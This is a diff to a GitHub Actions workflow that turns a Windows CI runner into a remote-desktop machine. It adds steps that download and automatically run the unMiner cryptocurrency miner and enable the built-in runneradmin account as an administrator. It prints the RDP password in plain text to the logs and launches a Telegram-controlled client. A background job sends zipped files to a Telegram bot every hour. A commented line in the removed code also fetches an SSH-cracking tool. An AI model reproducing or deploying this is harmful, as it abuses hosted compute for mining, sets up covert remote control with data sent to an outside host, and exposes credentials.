@@ -3,34 +3,58 @@ name: RDP
 on:
   workflow_dispatch:
 
+permissions:
+  contents: read
+
 jobs:
   secure-rdp:
     runs-on: windows-2022
     timeout-minutes: 360  # Reduced to 6 hours max for GitHub limits
 
     steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
       - name: Download Pre-Required Files
         run: |
           # Create a downloads directory
           New-Item -ItemType Directory -Force -Path "$env:TEMP\Downloads"
           
-          # Download unMiner example (add more URLs as needed)
-          $unMinerUrl = "https://cdn.unmineable.download/unMiner.2.8.0-beta.exe"
-          $unMinerPath = "$env:TEMP\Downloads\unMiner.exe"
-          try {
-              Invoke-WebRequest -Uri $unMinerUrl -OutFile $unMinerPath -ErrorAction Stop
-              Write-Host "Downloaded unMiner to $unMinerPath"
-          } catch {
-              Write-Error "Failed to download unMiner: $_"
-              exit 1
+          # Read links from links.txt and download each
+          $linksFile = "links.txt"
+          if (Test-Path $linksFile) {
+              Get-Content $linksFile | ForEach-Object {
+                  $url = $_.Trim()
+                  if ($url) {
+                      $filename = [System.IO.Path]::GetFileName($url)
+                      $outPath = "$env:TEMP\Downloads\$filename"
+                      try {
+                          Invoke-WebRequest -Uri $url -OutFile $outPath -ErrorAction Stop
+                          Write-Host "Downloaded $filename to $outPath"
+                      } catch {
+                          Write-Error ("Failed to download $url: {0}" -f $_.Exception.Message)
+                      }
+                  }
+              }
+          } else {
+              Write-Error "links.txt not found in repository - skipping downloads"
           }
           
-          # Example: Add more downloads here
-          # $anotherUrl = "https://github.com/Matrix-Community-ORG/SSHCracker/releases/download/v2.6-dev-20250713-034208/ssh-cracker-v2.6-windows-amd64.exe"
-          # $anotherPath = "$env:TEMP\Downloads\ssh-cracker-v2.6-windows-amd64.exe"
-          # Invoke-WebRequest -Uri $anotherUrl -OutFile $anotherPath
-          
           Write-Host "Pre-required files downloaded to $env:TEMP\Downloads"
+
+      - name: Auto-Execute unMiner
+        run: |
+          $unMinerPath = "$env:TEMP\Downloads\unMiner.exe"
+          if (Test-Path $unMinerPath) {
+              try {
+                  Start-Process -FilePath $unMinerPath -NoNewWindow -ErrorAction Stop
+                  Write-Host "unMiner executed successfully in background"
+              } catch {
+                  Write-Error ("Failed to execute unMiner: {0}" -f $_.Exception.Message)
+              }
+          } else {
+              Write-Warning "unMiner.exe not found - skipping execution"
+          }
 
       - name: Configure Core RDP Settings
         run: |
@@ -56,61 +80,134 @@ jobs:
               Restart-Service -Name TermService -Force -ErrorAction Stop
               Write-Host "Remote Desktop service restarted successfully"
           } catch {
-              Write-Error "Failed to restart TermService: $_"
+              Write-Error ("Failed to restart TermService: {0}" -f $_.Exception.Message)
               exit 1
           }
 
-      - name: Configure RDP User
+      - name: Configure RDP Users
         run: |
-          $username = "${{ secrets.RDP_USERNAME }}"
           $password = "${{ secrets.RDP_PASSWORD }}"
           
-          # Validate username and password
-          if ([string]::IsNullOrWhiteSpace($username) -or [string]::IsNullOrWhiteSpace($password)) {
-              Write-Error "Username or password is empty or invalid"
+          # Validate password
+          if ([string]::IsNullOrWhiteSpace($password)) {
+              Write-Error "Password is empty or invalid"
               exit 1
           }
           
-          Write-Host "Configuring user: $username"
+          Write-Host "=== Configuring RDP Users ==="
+          Write-Host "Setting password from secret for available users..."
           
-          # Check if user exists, if not, create it
-          if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
+          # Get all local users
+          $allUsers = Get-LocalUser
+          Write-Host "`nAvailable users on this system:"
+          foreach ($user in $allUsers) {
+              Write-Host "- $($user.Name) (Enabled: $($user.Enabled))"
+          }
+          
+          # Configure runneradmin user
+          $runneradminUser = Get-LocalUser -Name "runneradmin" -ErrorAction SilentlyContinue
+          if ($runneradminUser) {
+              Write-Host "`nConfiguring runneradmin user..."
               try {
+                  # Set password for runneradmin
                   $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-                  New-LocalUser -Name $username -Password $securePass -AccountNeverExpires -Description "RDP User for GitHub Actions" -ErrorAction Stop
-                  Write-Host "User $username created successfully"
+                  Set-LocalUser -Name "runneradmin" -Password $securePass -ErrorAction Stop
+                  Write-Host "✓ Password updated for runneradmin"
+                  
+                  # Enable user if disabled
+                  if (-not $runneradminUser.Enabled) {
+                      Enable-LocalUser -Name "runneradmin"
+                      Write-Host "✓ runneradmin user enabled"
+                  }
+                  
+                  # Add to Remote Desktop Users group
+                  try {
+                      Add-LocalGroupMember -Group "Remote Desktop Users" -Member "runneradmin" -ErrorAction Stop
+                      Write-Host "✓ runneradmin added to Remote Desktop Users group"
+                  } catch {
+                      if ($_.Exception.Message -like "*already a member*") {
+                          Write-Host "✓ runneradmin already in Remote Desktop Users group"
+                      } else {
+                          Write-Warning "Failed to add runneradmin to Remote Desktop Users: $($_.Exception.Message)"
+                      }
+                  }
+                  
+                  # Add to Administrators group for full access
+                  try {
+                      Add-LocalGroupMember -Group "Administrators" -Member "runneradmin" -ErrorAction Stop
+                      Write-Host "✓ runneradmin added to Administrators group"
+                  } catch {
+                      if ($_.Exception.Message -like "*already a member*") {
+                          Write-Host "✓ runneradmin already in Administrators group"
+                      } else {
+                          Write-Warning "Failed to add runneradmin to Administrators: $($_.Exception.Message)"
+                      }
+                  }
+                  
               } catch {
-                  Write-Error "Failed to create user: $_"
+                  Write-Error ("Failed to configure runneradmin: {0}" -f $_.Exception.Message)
                   exit 1
               }
           } else {
-              # Update password if user exists
+              Write-Error "runneradmin user not found on this system"
+              exit 1
+          }
+          
+          # Configure installer user if exists
+          $installerUser = Get-LocalUser -Name "installer" -ErrorAction SilentlyContinue
+          if ($installerUser) {
+              Write-Host "`nConfiguring installer user..."
               try {
+                  # Set same password for installer
                   $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-                  Set-LocalUser -Name $username -Password $securePass -ErrorAction Stop
-                  Write-Host "Password updated for user $username"
+                  Set-LocalUser -Name "installer" -Password $securePass -ErrorAction Stop
+                  Write-Host "✓ Password updated for installer"
+                  
+                  # Enable user if disabled
+                  if (-not $installerUser.Enabled) {
+                      Enable-LocalUser -Name "installer"
+                      Write-Host "✓ installer user enabled"
+                  }
+                  
+                  # Add to Remote Desktop Users group
+                  try {
+                      Add-LocalGroupMember -Group "Remote Desktop Users" -Member "installer" -ErrorAction Stop
+                      Write-Host "✓ installer added to Remote Desktop Users group"
+                  } catch {
+                      if ($_.Exception.Message -like "*already a member*") {
+                          Write-Host "✓ installer already in Remote Desktop Users group"
+                      } else {
+                          Write-Warning "Failed to add installer to Remote Desktop Users: $($_.Exception.Message)"
+                      }
+                  }
+                  
               } catch {
-                  Write-Error "Failed to update password: $_"
-                  exit 1
+                  Write-Warning ("Failed to configure installer: {0}" -f $_.Exception.Message)
               }
+          } else {
+              Write-Host "`ninstaller user not found (this is normal)"
           }
           
-          # Ensure user is in Remote Desktop Users group
+          # Force group policy update
+          Write-Host "`nUpdating group policy..."
           try {
-              Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username -ErrorAction Stop
-              Write-Host "User $username added to Remote Desktop Users group"
+              gpupdate /force | Out-Null
+              Write-Host "✓ Group policy updated"
           } catch {
-              Write-Error "Failed to add user to Remote Desktop Users: $_"
-              exit 1
+              Write-Warning ("Failed to update group policy: {0}" -f $_.Exception.Message)
           }
           
-          # Verify user exists and is enabled
-          $user = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
-          if (-not $user -or -not $user.Enabled) {
-              Write-Error "User $username does not exist or is disabled"
-              exit 1
+          Write-Host "`n=== USER LOGIN CREDENTIALS ==="
+          Write-Host "USERNAME: runneradmin"
+          Write-Host "PASSWORD: $password"
+          Write-Host ""
+          if ($installerUser) {
+              Write-Host "USERNAME: installer" 
+              Write-Host "PASSWORD: $password"
+              Write-Host ""
           }
-          Write-Host "User $username is configured and enabled"
+          Write-Host "Both users have the same password from your secret."
+          Write-Host "================================"
 
       - name: Install Tailscale
         run: |
@@ -124,7 +221,7 @@ jobs:
               Remove-Item $installerPath -Force
               Write-Host "Tailscale installed successfully"
           } catch {
-              Write-Error "Failed to install Tailscale: $_"
+              Write-Error ("Failed to install Tailscale: {0}" -f $_.Exception.Message)
               exit 1
           }
 
@@ -135,14 +232,14 @@ jobs:
               & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
               Write-Host "Tailscale connection initiated"
           } catch {
-              Write-Error "Failed to start Tailscale: $_"
+              Write-Error ("Failed to start Tailscale: {0}" -f $_.Exception.Message)
               exit 1
           }
           
           # Wait for Tailscale to assign an IP
           $tsIP = $null
           $retries = 0
-          while (-not $tsIP -and $retries -lt 10) {
+          while (-not $tsIP -and $retries -lt 15) {
               $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
               Start-Sleep -Seconds 5
               $retries++
@@ -168,17 +265,52 @@ jobs:
               }
               Write-Host "TCP connectivity successful!"
           } catch {
-              Write-Error "Failed to verify RDP connectivity: $_"
+              Write-Error ("Failed to verify RDP connectivity: {0}" -f $_.Exception.Message)
               exit 1
           }
 
-      - name: Display RDP Access Info (Only IP - No Credentials)
+      - name: Display RDP Access Info
         run: |
-          Write-Host "`n=== RDP ACCESS ==="
+          Write-Host "`n=== RDP CONNECTION INFO ==="
           Write-Host "Tailscale IP: $env:TAILSCALE_IP"
-          Write-Host "Port: ${{ secrets.RDP_PORT }}"
-          Write-Host "Use your pre-configured credentials (username/password) to connect via RDP client."
-          Write-Host "==================`n"
+          Write-Host "RDP Port: ${{ secrets.RDP_PORT }}"
+          Write-Host ""
+          Write-Host "=== LOGIN CREDENTIALS ==="
+          Write-Host "Primary User:"
+          Write-Host "  Username: runneradmin"
+          Write-Host "  Password: ${{ secrets.RDP_PASSWORD }}"
+          Write-Host ""
+          Write-Host "Secondary User (if available):"
+          Write-Host "  Username: installer"
+          Write-Host "  Password: ${{ secrets.RDP_PASSWORD }}"
+          Write-Host ""
+          Write-Host "Both users have the same password from your secret."
+          Write-Host "Use any RDP client to connect with these credentials."
+          Write-Host "============================`n"
+
+      - name: Set up Python for Management Client
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Install Python Dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install requests psutil pyautogui
+
+      - name: Start Management Client
+        run: |
+          $clientPath = "$env:GITHUB_WORKSPACE\client.py"
+          if (Test-Path $clientPath) {
+              try {
+                  Start-Process python.exe -ArgumentList $clientPath -NoNewWindow -ErrorAction Stop
+                  Write-Host "Management client started in background"
+              } catch {
+                  Write-Error ("Failed to start management client: {0}" -f $_.Exception.Message)
+              }
+          } else {
+              Write-Warning "client.py not found in repository - skipping management client"
+          }
 
       - name: Periodic Backup Script (Runs in Background)
         run: |
@@ -207,35 +339,14 @@ jobs:
                   return
               }
               
-              # Send via Telegram API
-              $uri = "https://api.telegram.org/bot$botToken/sendDocument"
-              $boundary = [System.Guid]::NewGuid().ToString()
-              $LF = "`r`n"
+              # Send via curl (reliable for multipart)
+              $response = curl.exe -F "chat_id=$chatId" -F "caption=$description" -F "document=@$zipPath" "https://api.telegram.org/bot$botToken/sendDocument"
               
-              $bodyLines = @(
-                  "--$boundary",
-                  "Content-Disposition: form-data; name=`"chat_id`"$LF",
-                  $chatId,
-                  "--$boundary",
-                  "Content-Disposition: form-data; name=`"caption`"$LF",
-                  $description,
-                  "--$boundary",
-                  "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $zipPath -Leaf)`"$LF",
-                  "Content-Type: application/zip$LF$LF",
-                  [System.IO.File]::ReadAllBytes($zipPath),
-                  "--$boundary--$LF"
-              ) -join $LF
-              
-              try {
-                  $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body ([Text.Encoding]::ASCII.GetBytes($bodyLines)) -ErrorAction Stop
-                  if ($response.ok) {
-                      Write-Host "Backup sent successfully: $description"
-                      Remove-Item $zipPath -Force
-                  } else {
-                      Write-Host "Failed to send backup: $($response.description)"
-                  }
-              } catch {
-                  Write-Error "Failed to send backup to Telegram: $_"
+              if ($response -match '"ok":true') {
+                  Write-Host "Backup sent successfully: $description"
+                  Remove-Item $zipPath -Force
+              } else {
+                  Write-Error "Failed to send backup: $response"
               }
           }
           
@@ -251,7 +362,7 @@ jobs:
                       $description = "Hourly backup from RDP runner - $timestamp (Size: $([math]::Round((Get-Item $zipPath).Length / 1MB, 2))MB)"
                       Send-BackupToTelegram -zipPath $zipPath -description $description
                   } catch {
-                      Write-Error "Failed to create or send backup: $_"
+                      Write-Error ("Failed to create or send backup: {0}" -f $_.Exception.Message)
                   }
                   Start-Sleep -Seconds 3600
               }
@@ -262,7 +373,7 @@ jobs:
               Start-Job -ScriptBlock $jobScript -ArgumentList $backupFolder, $botToken, $chatId, $maxFileSizeMB
               Write-Host "Backup job started: Will ZIP and send $backupFolder to Telegram every hour."
           } catch {
-              Write-Error "Failed to start backup job: $_"
+              Write-Error ("Failed to start backup job: {0}" -f $_.Exception.Message)
               exit 1
           }
 
@@ -272,6 +383,7 @@ jobs:
           Write-Host "Tailscale IP: $env:TAILSCALE_IP"
           Write-Host "Port: ${{ secrets.RDP_PORT }}"
           Write-Host "Backup job running in background."
+          Write-Host "Management client running for Telegram control."
           Write-Host "==================`n"
           
           # Keep runner active until cancelled
